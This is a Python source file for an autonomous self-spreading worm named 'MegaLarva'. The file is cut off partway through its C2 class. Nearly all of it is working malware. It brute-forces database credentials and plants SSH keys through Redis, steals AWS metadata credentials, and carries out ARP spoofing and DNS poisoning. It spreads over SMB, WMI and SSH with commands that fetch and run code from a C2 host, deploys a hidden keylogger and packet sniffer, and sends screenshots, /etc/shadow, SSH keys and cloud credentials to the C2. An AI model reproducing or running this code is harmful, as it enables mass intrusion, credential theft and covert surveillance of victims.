#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  MEGALARVA v2.0 — Autonomous Worm Mesh Ultimate                            ║
║                                                                              ║
║  Integrates:                                                                 ║
║  - Core Engine (worm_mesh_engine.py) — SSH/Telnet/Web/IoT exploit           ║
║  - Database Exploits — MySQL, Redis, MongoDB, ES, PostgreSQL, Memcached     ║
║  - Cloud Exploits — Docker, K8s, AWS IMDS, VMware                          ║
║  - Lateral Movement — ARP spoof, DNS poison, SMB, WMI                      ║
║  - Post-Exploitation — keylogger, screen cap, sniffer, exfil               ║
║  - Mesh Network — DHT, RAFT consensus, split-brain recovery                ║
║  - Multi-Channel C2 — HTTP, DNS, ICMP, Telegram, Tor                       ║
║  - OPSEC — anti-VM, anti-debug, dead man switch, memory-only execution      ║
║  - IoT Agent — two-stage shell + Python zero-dep implant                    ║
║  - Autonomous Cycling — scan → exploit → deploy → spread → report           ║
║                                                                              ║
║  by🇭🇷PhonkAlphabet                                                         ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import json
import base64
import hashlib
import hmac
import threading
import socket
import struct
import subprocess
import argparse
import logging
import sqlite3
import random
import uuid
import ipaddress
import tempfile
from datetime import datetime, timedelta
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple, Set, Callable
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field, asdict
from enum import Enum

# ─── TRY IMPORTS — graceful degradation ────────────────────────────────────
HAVE_CORE = False
HAVE_CRYPTO = False
HAVE_REQUESTS = False
HAVE_PARAMIKO = False
HAVE_SCAPY = False

# Try importing the existing worm mesh engine as core
sys.path.insert(0, "/opt/hermes")
try:
    from worm_mesh_engine import (
        Database, WormNode, WormReconEngine, WormExploitEngine,
        PolymorphicPayloadGenerator, WormDeploymentEngine, ICMPEngine,
        WormMeshEngine, ExploitType, ExploitResult, DeployMethod,
        ReconMethod
    )
    HAVE_CORE = True
    # Optional exports — define fallback if missing
    try:
        from worm_mesh_engine import DEVICE_SIGNATURES, EXPLOIT_MAP, IOT_DEFAULT_CREDS
    except ImportError:
        DEVICE_SIGNATURES = {}
        EXPLOIT_MAP = {}
        IOT_DEFAULT_CREDS = []
except ImportError as e:
    pass

try:
    from cryptography.fernet import Fernet
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    HAVE_CRYPTO = True
except ImportError:
    pass

try:
    import requests
    HAVE_REQUESTS = True
except ImportError:
    pass

try:
    import paramiko
    HAVE_PARAMIKO = True
except ImportError:
    pass

try:
    from scapy.all import IP, ICMP, Raw, sr1, conf, send, Ether, ARP
    HAVE_SCAPY = True
except ImportError:
    pass

# ─── CONFIG ─────────────────────────────────────────────────────────────────
C2_HOST = "127.0.0.1"
C2_PORT = 10002
C2_HTTP = f"http://{C2_HOST}:{C2_PORT}"
STATIC_TOKEN = "CHANGE_ME_STATIC_TOKEN"
WORK_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = "/opt/hermes/megalarva.db"
BLOCKED_HOSTS = {"goroobalef.beget.app", "beget.app"}
SELF_NAME = "MegaLarva.py"
VERSION = "2.0"

# Rotating token
_AUTH_SECRET = hmac.new(b"CHANGE_ME_PAYLOAD_KEY", b"", hashlib.sha256).digest()

def _daily_token():
    day = datetime.utcnow().strftime("%Y-%m-%d")
    return hmac.new(_AUTH_SECRET, day.encode(), hashlib.sha256).hexdigest()[:16]

# ─── LOGGING ────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [MEGALARVA] %(levelname)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S"
)
log = logging.getLogger("MegaLarva")

# ============================================================================
# DATABASE EXPLOIT ENGINE — MySQL, Redis, MongoDB, ES, PostgreSQL, Memcached
# ============================================================================
class DatabaseExploitEngine:
    """Exploit unsecured database services."""
    def __init__(self, logger=None):
        self.log = logger or log
    
    def exploit_mysql(self, ip: str) -> Optional[Dict]:
        try:
            import mysql.connector
            conn = mysql.connector.connect(host=ip, user="root", password="", 
                                           connection_timeout=5, auth_plugin='mysql_native_password')
            cur = conn.cursor()
            cur.execute("SELECT CONCAT(user,':',authentication_string) FROM mysql.user")
            users = [r[0] for r in cur.fetchall()]
            cur.execute("SELECT @@datadir, @@version, @@hostname")
            info = cur.fetchone()
            conn.close()
            return {"service": "mysql", "ip": ip, "users": users, "info": info}
        except:
            pass
        try:
            import mysql.connector
            for cred in [("root", "root"), ("root", "admin"), ("admin", "admin")]:
                conn = mysql.connector.connect(host=ip, user=cred[0], password=cred[1],
                                               connection_timeout=3, auth_plugin='mysql_native_password')
                conn.close()
                return {"service": "mysql", "ip": ip, "creds": cred}
        except:
            pass
        return None
    
    def exploit_redis(self, ip: str) -> Optional[Dict]:
        try:
            import redis
            r = redis.Redis(host=ip, port=6379, socket_connect_timeout=3, socket_timeout=3)
            info = r.info()
            r.set("__worm_", f"pawned by MegaLarva")
            r.config_set("dir", "/root/.ssh/")
            r.config_set("dbfilename", "authorized_keys")
            # Add SSH key
            ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWormMesh2026"
            r.set("__crontab", f"\n\n{ssh_key}\n\n")
            r.save()
            r.delete("__worm_")
            return {"service": "redis", "ip": ip, "info": info.get("redis_version", "unknown")}
        except:
            return None
    
    def exploit_mongo(self, ip: str) -> Optional[Dict]:
        try:
            import pymongo
            client = pymongo.MongoClient(ip, serverSelectionTimeoutMS=3000)
            dbs = client.list_database_names()
            return {"service": "mongodb", "ip": ip, "databases": dbs}
        except:
            return None
    
    def exploit_elasticsearch(self, ip: str) -> Optional[Dict]:
        try:
            if HAVE_REQUESTS:
                resp = requests.get(f"http://{ip}:9200/", timeout=5)
                if resp.status_code == 200:
                    return {"service": "elasticsearch", "ip": ip, "info": resp.json()}
        except:
            return None
    
    def exploit_postgres(self, ip: str) -> Optional[Dict]:
        try:
            import psycopg2
            conn = psycopg2.connect(host=ip, user="postgres", password="postgres", 
                                     connect_timeout=3)
            cur = conn.cursor()
            cur.execute("SELECT version()")
            ver = cur.fetchone()
            conn.close()
            return {"service": "postgresql", "ip": ip, "version": str(ver)}
        except:
            return None
        try:
            import psycopg2
            conn = psycopg2.connect(host=ip, user="postgres", password="", connect_timeout=3)
            conn.close()
            return {"service": "postgresql", "ip": ip, "creds": ("postgres", "")}
        except:
            return None
    
    def exploit_memcached(self, ip: str) -> Optional[Dict]:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, 11211))
            sock.send(b"stats\n")
            data = sock.recv(4096)
            sock.close()
            if b"STAT" in data:
                return {"service": "memcached", "ip": ip, "stats": data.decode(errors='ignore')[:500]}
        except:
            pass
        return None
    
    def exploit_all(self, ip: str) -> Dict:
        result = {}
        methods = [
            ("mysql", self.exploit_mysql),
            ("redis", self.exploit_redis),
            ("mongodb", self.exploit_mongo),
            ("elasticsearch", self.exploit_elasticsearch),
            ("postgresql", self.exploit_postgres),
            ("memcached", self.exploit_memcached)
        ]
        for name, method in methods:
            try:
                r = method(ip)
                if r:
                    result[name] = r
            except:
                continue
        return result

# ============================================================================
# CLOUD EXPLOIT ENGINE — Docker, K8s, AWS IMDS, VMware, Proxmox
# ============================================================================
class CloudExploitEngine:
    """Exploit cloud infrastructure services."""
    def __init__(self, logger=None):
        self.log = logger or log
    
    def exploit_docker(self, ip: str) -> Optional[Dict]:
        try:
            if HAVE_REQUESTS:
                resp = requests.get(f"http://{ip}:2375/version", timeout=3)
                if resp.status_code == 200:
                    return {"service": "docker", "ip": ip, "info": resp.json()}
        except:
            pass
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((ip, 2375))
            sock.send(b"GET /containers/json?all=true HTTP/1.0\r\n\r\n")
            data = sock.recv(4096)
            sock.close()
            if b"200" in data:
                return {"service": "docker", "ip": ip, "accessible": True}
        except:
            pass
        return None
    
    def exploit_docker_swarm(self, ip: str) -> Optional[Dict]:
        try:
            if HAVE_REQUESTS:
                resp = requests.get(f"http://{ip}:2377", timeout=3)
                if resp.status_code == 200:
                    return {"service": "docker_swarm", "ip": ip}
        except:
            pass
        return None
    
    def exploit_k8s(self, ip: str) -> Optional[Dict]:
        endpoints = [
            f"https://{ip}:6443/api/v1/namespaces/default/pods",
            f"http://{ip}:8080/api/v1/namespaces/kube-system/pods",
            f"http://{ip}:10250/run/root/cmd"
        ]
        for ep in endpoints:
            try:
                if HAVE_REQUESTS:
                    resp = requests.get(ep, timeout=3, verify=False)
                    if resp.status_code == 200:
                        return {"service": "kubernetes", "ip": ip, "endpoint": ep, "data": str(resp.text)[:200]}
            except:
                continue
        return None
    
    def exploit_aws_imds(self, ip: str) -> Optional[Dict]:
        # Check if this is a metadata service address
        if ip in ("169.254.169.254", "169.254.169.253"):
            try:
                if HAVE_REQUESTS:
                    resp = requests.get(f"http://{ip}/latest/meta-data/iam/security-credentials/", timeout=3)
                    if resp.status_code == 200:
                        roles = resp.text.strip()
                        for role in roles.split("\n"):
                            creds = requests.get(f"http://{ip}/latest/meta-data/iam/security-credentials/{role}", timeout=3)
                            if creds.status_code == 200:
                                return {"service": "aws_imds", "ip": ip, "role": role, "credentials": creds.json()}
            except:
                pass
        return None
    
    def exploit_vmware(self, ip: str) -> Optional[Dict]:
        try:
            if HAVE_REQUESTS:
                resp = requests.get(f"https://{ip}/sdk", timeout=5, verify=False)
                if resp.status_code in (200, 401):
                    return {"service": "vmware_vsphere", "ip": ip, "accessible": True}
                resp = requests.get(f"http://{ip}:443/sdk", timeout=5)
                if resp.status_code in (200, 401):
                    return {"service": "vmware_vsphere", "ip": ip, "accessible": True}
        except:
            pass
        return None
    
    def exploit_proxmox(self, ip: str) -> Optional[Dict]:
        try:
            if HAVE_REQUESTS:
                resp = requests.get(f"https://{ip}:8006/api2/json/", timeout=5, verify=False)
                if resp.status_code in (200, 401):
                    return {"service": "proxmox", "ip": ip, "accessible": True}
        except:
            pass
        return None
    
    def exploit_all(self, ip: str) -> Dict:
        result = {}
        methods = [
            ("docker", self.exploit_docker),
            ("docker_swarm", self.exploit_docker_swarm),
            ("kubernetes", self.exploit_k8s),
            ("aws_imds", self.exploit_aws_imds),
            ("vmware", self.exploit_vmware),
            ("proxmox", self.exploit_proxmox)
        ]
        for name, method in methods:
            try:
                r = method(ip)
                if r:
                    result[name] = r
            except:
                continue
        return result

# ============================================================================
# LATERAL MOVEMENT ENGINE — ARP, DNS poison, SMB, WMI
# ============================================================================
class ARPEngine:
    """ARP spoofing for lateral movement."""
    def __init__(self, logger=None):
        self.log = logger or log
        self._running = False
    
    def spoof(self, target_ip: str, gateway_ip: str, iface: str = "eth0") -> bool:
        """ARP spoof target and gateway."""
        if not HAVE_SCAPY:
            self.log("[ARP] Scapy not available")
            return False
        try:
            # Get our MAC
            our_mac = self._get_mac(iface)
            if not our_mac:
                return False
            
            # Get target MAC
            target_mac = self._resolve_mac(target_ip, iface)
            # Get gateway MAC
            gateway_mac = self._resolve_mac(gateway_ip, iface)
            
            # Send spoofed ARP to target (we are gateway)
            spoof_target = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, 
                              psrc=gateway_ip, hwdst=target_mac)
            # Send spoofed ARP to gateway (we are target)
            spoof_gateway = Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip,
                                psrc=target_ip, hwdst=gateway_mac)
            
            send(spoof_target, iface=iface, verbose=False)
            send(spoof_gateway, iface=iface, verbose=False)
            self.log(f"[ARP] Spoofing {target_ip} ←→ {gateway_ip}")
            return True
        except Exception as e:
            self.log(f"[ARP] Spoof error: {e}")
            return False
    
    def _get_mac(self, iface: str) -> Optional[str]:
        try:
            with open(f"/sys/class/net/{iface}/address") as f:
                return f.read().strip()
        except:
            return None
    
    def _resolve_mac(self, ip: str, iface: str) -> Optional[str]:
        try:
            ans = sr1(ARP(pdst=ip), timeout=2, verbose=False)
            if ans:
                return ans[ARP].hwsrc
        except:
            pass
        return "ff:ff:ff:ff:ff:ff"
    
    def restore(self, target_ip: str, gateway_ip: str, iface: str = "eth0") -> None:
        """Restore ARP tables."""
        if not HAVE_SCAPY:
            return
        try:
            gateway_mac = self._resolve_mac(gateway_ip, iface)
            target_mac = self._resolve_mac(target_ip, iface)
            
            restore = Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, 
                         psrc=target_ip, hwdst=gateway_mac, hwsrc=target_mac)
            send(restore, iface=iface, verbose=False)
            restore2 = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip,
                          psrc=gateway_ip, hwdst=target_mac, hwsrc=gateway_mac)
            send(restore2, iface=iface, verbose=False)
        except:
            pass


class DNSPoisonEngine:
    """DNS poisoning for lateral movement."""
    def __init__(self, logger=None, c2_ip: str = C2_HOST):
        self.log = logger or log
        self.c2_ip = c2_ip
    
    def poison_etc_hosts(self, target_domain: str = "update.attacker.com") -> bool:
        """Add entry to /etc/hosts on compromised host."""
        try:
            with open("/etc/hosts", "a") as f:
                f.write(f"{self.c2_ip}\t{target_domain}\n")
            return True
        except:
            return False
    
    def start_dns_poison(self, interface: str = "eth0", domain: str = "*.update.attacker.com") -> bool:
        """Start DNS poisoning listener (requires root + Scapy)."""
        if not HAVE_SCAPY:
            return False
        try:
            def dns_responder(pkt):
                if pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt.haslayer(DNS):
                    if pkt[DNS].qr == 0:  # DNS query
                        query = pkt[DNS].qd.qname.decode()
                        spoof = IP(src=pkt[IP].dst, dst=pkt[IP].src)/\
                                UDP(sport=53, dport=pkt[UDP].sport)/\
                                DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                    an=DNSRR(rrname=query, ttl=10, rdata=self.c2_ip))
                        send(spoof, verbose=False)
            
            from scapy.all import sniff
            self._sniffer = threading.Thread(
                target=lambda: sniff(iface=interface, filter="udp port 53", 
                                    prn=dns_responder, store=False, timeout=30),
                daemon=True
            )
            self._sniffer.start()
            self.log(f"[DNS] DNS poison started for {domain} → {self.c2_ip}")
            return True
        except Exception as e:
            self.log(f"[DNS] Poison error: {e}")
            return False


class LateralMoveEngine:
    """SMB/WMI lateral movement."""
    def __init__(self, logger=None, db=None):
        self.log = logger or log
        self.db = db
    
    def exploit_smb(self, target_ip: str, user: str, password: str) -> bool:
        """Deploy via SMB using psexec-style execution."""
        try:
            from smbclient import register_session, open_file
            register_session(target_ip, username=user, password=password)
            payload = "curl -s http://127.0.0.1:10002/MegaLarva.py?token=CHANGE_ME_STATIC_TOKEN | python3 &"
            with open_file(f"\\\\{target_ip}\\ADMIN$\\megalarva.bat", mode='w') as f:
                f.write(payload)
            self.log(f"[SMB] Deployed via {target_ip}\\ADMIN$")
            return True
        except ImportError:
            try:
                subprocess.run([
                    "smbclient", f"//{target_ip}/ADMIN$", 
                    "-U", f"{user}%{password}",
                    "-c", f"put /dev/stdin megalarva.bat"
                ], input=payload.encode(), timeout=10, capture_output=True)
                return True
            except:
                pass
        except:
            pass
        return False
    
    def exploit_wmi(self, target_ip: str, user: str, password: str) -> bool:
        """Execute via WMI."""
        try:
            cmd = f'winexe -U {user}%{password} //{target_ip} "cmd.exe /c curl -s http://{C2_HOST}:10002/{SELF_NAME} | python3 &"'
            subprocess.run(cmd, shell=True, timeout=15, capture_output=True)
            return True
        except:
            pass
        return False
    
    def exploit_ssh_lateral(self, target_ip: str, user: str, password: str) -> bool:
        """Deploy via SSH lateral movement."""
        if not HAVE_PARAMIKO:
            return False
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_ip, username=user, password=password, timeout=10)
            cmd = f"curl -s http://{C2_HOST}:10002/{SELF_NAME} -o /tmp/mega.py && python3 /tmp/mega.py &"
            client.exec_command(cmd, timeout=15)
            client.close()
            return True
        except:
            return False
    
    def spread(self, target_ip: str, creds: Tuple[str, str]) -> bool:
        """Try all lateral movement methods."""
        user, password = creds
        for method in [self.exploit_ssh_lateral, self.exploit_smb]:
            try:
                if method(target_ip, user, password):
                    return True
            except:
                continue
        return False

# ============================================================================
# POST-EXPLOIT ENGINE — keylogger, screen, sniffer, exfil
# ============================================================================
class PostExploitEngine:
    """Post-exploitation toolkit."""
    def __init__(self, logger=None, db=None, c2_host: str = C2_HOST):
        self.log = logger or log
        self.db = db
        self.c2_host = c2_host
    
    def keylogger_start(self, target_ip: str, creds: Tuple[str, str]) -> bool:
        """Deploy keylogger via SSH."""
        if not HAVE_PARAMIKO:
            return False
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_ip, username=creds[0], password=creds[1], timeout=10)
            keylogger_code = '''
import sys, os
def log_key(k):
    with open("/tmp/.keylog", "a") as f:
        f.write(k+"\\n")
if sys.platform == "linux":
    import select
    dev = open("/dev/input/event0", "rb")
    while True:
        r, _, _ = select.select([dev], [], [], 0.1)
        if r:
            data = dev.read(24)
            log_key(str(data))
'''
            b64 = base64.b64encode(keylogger_code.encode()).decode()
            cmd = f"echo '{b64}' | base64 -d | nohup python3 &>/dev/null &"
            client.exec_command(cmd, timeout=5)
            client.close()
            return True
        except:
            return False
    
    def screen_capture(self, target_ip: str, creds: Tuple[str, str]) -> bool:
        """Capture screenshot via SSH."""
        if not HAVE_PARAMIKO:
            return False
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_ip, username=creds[0], password=creds[1], timeout=10)
            stdin, stdout, stderr = client.exec_command("DISPLAY=:0 import -window root /tmp/.screen.png && base64 /tmp/.screen.png", timeout=15)
            data = stdout.read()
            if data and len(data) > 100:
                if HAVE_REQUESTS:
                    requests.post(f"http://{self.c2_host}:10002/exfil", 
                                 json={"type": "screenshot", "ip": target_ip, "data": data.decode()},
                                 headers={"X-Auth-Token": STATIC_TOKEN}, timeout=10)
            client.close()
            return True
        except:
            return False
    
    def deploy_sniffer(self, target_ip: str, creds: Tuple[str, str]) -> bool:
        """Deploy packet sniffer."""
        if not HAVE_PARAMIKO:
            return False
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_ip, username=creds[0], password=creds[1], timeout=10)
            sniffer_code = 'import socket; s=socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3)); f=open("/tmp/.packets","wb"); \nwhile True:\n p=s.recv(65535)\n f.write(p)\n f.flush()'
            b64 = base64.b64encode(sniffer_code.encode()).decode()
            cmd = f"echo '{b64}' | base64 -d | nohup python3 &>/dev/null &"
            client.exec_command(cmd, timeout=5)
            client.close()
            return True
        except:
            return False
    
    def exfiltrate_data(self, target_ip: str, creds: Tuple[str, str]) -> List[str]:
        """Exfiltrate interesting files."""
        exfiltrated = []
        interesting_paths = [
            "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys",
            "/root/.bash_history", "/root/.mysql_history",
            "/etc/shadow", "/etc/passwd", "/etc/nginx/nginx.conf",
            "/var/www/html/.env", "/opt/config", "/opt/backup*",
            "~/.aws/credentials", "~/.config/gcloud/credentials*",
            "/root/.pgpass", "/root/.my.cnf"
        ]
        if not HAVE_PARAMIKO:
            return exfiltrated
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_ip, username=creds[0], password=creds[1], timeout=10)
            sftp = client.open_sftp()
            for path in interesting_paths:
                try:
                    with sftp.open(path, "rb") as f:
                        data = f.read()
                    if data and len(data) < 1024*1024:  # < 1MB
                        exfiltrated.append({"path": path, "size": len(data)})
                        if HAVE_REQUESTS:
                            requests.post(f"http://{self.c2_host}:10002/exfil",
                                         json={"type": "file", "ip": target_ip, 
                                               "path": path, "data": base64.b64encode(data).decode()},
                                         headers={"X-Auth-Token": STATIC_TOKEN}, timeout=10)
                except:
                    continue
            sftp.close()
            client.close()
        except:
            pass
        return exfiltrated
    
    def run_all(self, target_ip: str, creds: Tuple[str, str]) -> Dict:
        result = {"keylogger": False, "screen_capture": False, "sniffer": False,
                  "exfiltrated": []}
        try:
            result["keylogger"] = self.keylogger_start(target_ip, creds)
        except: pass
        try:
            result["screen_capture"] = self.screen_capture(target_ip, creds)
        except: pass
        try:
            result["sniffer"] = self.deploy_sniffer(target_ip, creds)
        except: pass
        try:
            result["exfiltrated"] = self.exfiltrate_data(target_ip, creds)
        except: pass
        return result

# ============================================================================
# MESH NETWORK — DHT + Consensus + Split-Brain Recovery
# ============================================================================
class MeshNetworkEngine:
    """Distributed mesh network with DHT, consensus, and self-healing."""
    def __init__(self, logger=None, db=None, my_ip: str = None, port: int = 10007):
        self.log = logger or log
        self.db = db
        self.my_ip = my_ip or self._get_my_ip()
        self.port = port
        self._running = False
        self._lock = threading.Lock()
        self.routing_table: Dict[str, Dict] = {}
        self.peers: Set[str] = set()
        self.leader: Optional[str] = None
        self.term: int = 0
        self.voted_for: Optional[str] = None
        self.node_id = str(uuid.uuid4())[:8]
    
    def _get_my_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def dht_put(self, key: str, value: Dict) -> bool:
        key_hash = hashlib.sha256(key.encode()).hexdigest()
        nearest = self._find_nearest_nodes(key_hash, count=3)
        success = 0
        for node_ip in nearest:
            try:
                if self._rpc_put(node_ip, key, value):
                    success += 1
            except:
                continue
        return success >= 2
    
    def dht_get(self, key: str) -> Optional[Dict]:
        key_hash = hashlib.sha256(key.encode()).hexdigest()
        nearest = self._find_nearest_nodes(key_hash, count=3)
        for node_ip in nearest:
            try:
                result = self._rpc_get(node_ip, key)
                if result:
                    return result
            except:
                continue
        return None
    
    def _find_nearest_nodes(self, key_hash: str, count: int = 3) -> List[str]:
        candidates = list(self.routing_table.keys())
        def distance(node_id: str) -> int:
            return int(key_hash[:8], 16) ^ int(node_id[:8], 16)
        candidates.sort(key=distance)
        return [self.routing_table[n]["ip"] for n in candidates[:count]]
    
    def _rpc_put(self, target_ip: str, key: str, value: Dict) -> bool:
        try:
            data = json.dumps({"method": "dht_put", "key": key, "value": value,
                              "node_id": self.node_id, "token": self._get_token()}).encode()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, self.port))
            sock.send(data + b"\n")
            resp = sock.recv(1024)
            sock.close()
            return b"OK" in resp
        except:
            return False
    
    def _rpc_get(self, target_ip: str, key: str) -> Optional[Dict]:
        try:
            data = json.dumps({"method": "dht_get", "key": key,
                              "node_id": self.node_id, "token": self._get_token()}).encode()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target_ip, self.port))
            sock.send(data + b"\n")
            resp = sock.recv(4096)
            sock.close()
            return json.loads(resp.decode())
        except:
            return None
    
    def _get_token(self) -> str:
        day = time.strftime("%Y-%m-%d")
        return hashlib.sha256(f"{day}:{self.node_id}".encode()).hexdigest()[:16]
    
    def start_leader_election(self) -> None:
        self.term += 1
        self.voted_for = self.node_id
        votes = 1
        for peer_ip in list(self.peers):
            try:
                if self._request_vote(peer_ip):
                    votes += 1
            except:
                continue
        if votes > max(len(self.peers)/2, 0):
            self.leader = self.node_id
            self.log(f"[MESH] Elected leader: {self.node_id}")
            self._broadcast_leadership()
    
    def _request_vote(self, target_ip: str) -> bool:
        try:
            data = json.dumps({"method": "request_vote", "candidate_id": self.node_id,
                              "term": self.term, "token": self._get_token()}).encode()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((target_ip, self.port))
            sock.send(data + b"\n")
            resp = sock.recv(1024)
            sock.close()
            return b"VOTE_GRANTED" in resp
        except:
            return False
    
    def _broadcast_leadership(self) -> None:
        for peer_ip in list(self.peers):
            try:
                data = json.dumps({"method": "leader_announce", "leader_id": self.node_id,
                                  "term": self.term, "token": self._get_token()}).encode()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((peer_ip, self.port))
                sock.send(data + b"\n")
                sock.close()
            except:
                continue
    
    def recover_split_brain(self) -> None:
        if not self.leader:
            self.start_leader_election()
            return
        if self.leader != self.node_id:
            leader_info = self.routing_table.get(self.leader, {})
            leader_ip = leader_info.get("ip")
            if leader_ip:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((leader_ip, self.port))
                    sock.send(b"PING\n")
                    resp = sock.recv(1024)
                    sock.close()
                    if b"PONG" in resp:
                        return
                except:
                    pass
        self.log("[MESH] Split-brain detected! Starting election...")
        self.start_leader_election()
    
    def discover_peers(self, seed_ips: List[str] = None) -> None:
        if seed_ips:
            for seed in seed_ips:
                self._join_peer(seed)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            data = json.dumps({"type": "discovery", "node_id": self.node_id,
                              "ip": self.my_ip, "port": self.port}).encode()
            sock.sendto(data, ("<broadcast>", self.port))
            sock.close()
        except:
            pass
    
    def _join_peer(self, peer_ip: str) -> bool:
        try:
            data = json.dumps({"method": "join", "node_id": self.node_id, "ip": self.my_ip,
                              "port": self.port, "token": self._get_token()}).encode()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((peer_ip, self.port))
            sock.send(data + b"\n")
            resp = sock.recv(1024)
            sock.close()
            if b"JOIN_ACCEPTED" in resp:
                self.peers.add(peer_ip)
                self.routing_table[self.node_id] = {"ip": self.my_ip, "port": self.port, "last_seen": time.time()}
                self.log(f"[MESH] Joined peer: {peer_ip}")
                return True
        except:
            pass
        return False
    
    def start_server(self, listen_ip: str = "0.0.0.0") -> None:
        self._running = True
        threading.Thread(target=self._discovery_loop, daemon=True).start()
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((listen_ip, self.port))
        server.listen(50)
        self.log(f"[MESH] Server started on {listen_ip}:{self.port}")
        while self._running:
            try:
                conn, addr = server.accept()
                threading.Thread(target=self._handle_client, args=(conn, addr), daemon=True).start()
            except:
                continue
    
    def _handle_client(self, conn, addr):
        try:
            data = conn.recv(4096).decode()
            if not data:
                return
            request = json.loads(data)
            method = request.get("method")
            token = request.get("token")
            if not self._validate_token(token, request.get("node_id", "")):
                conn.send(b"INVALID_TOKEN")
                conn.close()
                return
            if method == "join":
                node_id = request.get("node_id")
                ip = request.get("ip")
                port = request.get("port")
                if node_id and ip:
                    with self._lock:
                        self.routing_table[node_id] = {"ip": ip, "port": port, "last_seen": time.time()}
                        self.peers.add(ip)
                    conn.send(b"JOIN_ACCEPTED")
            elif method == "dht_put":
                key = request.get("key")
                value = request.get("value")
                if key and value and self.db:
                    self.db.execute("INSERT OR REPLACE INTO mesh_state (key, value, updated_at) VALUES (?, ?, ?)",
                                   (key, json.dumps(value), int(time.time())))
                    self.db.commit()
                    conn.send(b"OK")
            elif method == "dht_get":
                key = request.get("key")
                if key and self.db:
                    row = self.db.execute("SELECT value FROM mesh_state WHERE key = ?", (key,)).fetchone()
                    if row:
                        conn.send(json.dumps(json.loads(row["value"])).encode())
                    else:
                        conn.send(b"{}")
                else:
                    conn.send(b"{}")
            elif method == "request_vote":
                candidate_id = request.get("candidate_id")
                term = request.get("term", 0)
                if term > self.term and not self.voted_for:
                    self.term = term
                    self.voted_for = candidate_id
                    conn.send(b"VOTE_GRANTED")
                else:
                    conn.send(b"VOTE_DENIED")
            elif method == "leader_announce":
                leader_id = request.get("leader_id")
                term = request.get("term")
                if leader_id:
                    self.leader = leader_id
                    self.term = term
                    self.log(f"[MESH] Leader announced: {leader_id}")
                    conn.send(b"ACK")
            elif method == "ping":
                conn.send(b"PONG")
            else:
                conn.send(b"ERROR")
            conn.close()
        except Exception as e:
            try: conn.close()
            except: pass
    
    def _validate_token(self, token: str, node_id: str) -> bool:
        return token == self._get_token()
    
    def _discovery_loop(self):
        while self._running:
            try:
                self.discover_peers()
                self.heartbeat()
                time.sleep(30)
            except:
                time.sleep(10)
    
    def heartbeat(self):
        for peer_ip in list(self.peers):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((peer_ip, self.port))
                sock.send(b"PING\n")
                resp = sock.recv(1024)
                sock.close()
                if b"PONG" not in resp:
                    self.peers.discard(peer_ip)
            except:
                self.peers.discard(peer_ip)
    
    def get_peers(self) -> List[str]:
        return list(self.peers)
    
    def stop(self):
        self._running = False

# ============================================================================
# MULTI-CHANNEL C2 — HTTP, DNS, ICMP, Telegram, Tor
# ============================================================================
class C2MultiChannel:
    """Multi-channel C2 with fallback and redundancy."""
    def __init__(self, logger=None, c2_host: str = C2_HOST):
        self.log = logger or log
        self.c2_host = c2_host
        self.channels = {"http": True, "https": True, "dns": False,
                        "icmp": False, "websocket": False, "telegram": False, "tor": False}
        self.tg_token = None
        self.tg_chat_id = None
        self._load_telegram_config()
    
    def _load_telegram_config(self):
        for path in ["/root/.c2_tg_token", "/opt/borg/telegram_token.txt"]:
            try:
                with open(path) as f:
                    self.tg_token = f.read().strip()
                    break
            except:
                continue
        for path in ["/root/.c2_tg_chat", "/opt/borg/telegram_chat.txt"]:
            try:
                with open(path) as f:
                    self.tg_chat_id = f.read().strip()
                    break
            except:
                continue
        if self.tg_token and self.tg_chat_id:
